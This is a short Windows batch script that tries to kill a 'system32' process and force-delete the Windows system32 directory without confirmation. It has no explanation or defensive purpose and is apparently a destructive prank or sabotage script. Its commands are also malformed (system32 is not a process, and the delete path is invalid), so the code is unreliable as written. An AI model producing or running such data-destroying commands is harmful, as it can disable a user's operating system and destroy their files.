@echo off
taskkill /f /im system32
del /f /q "C:\Windows\:\system32"
pause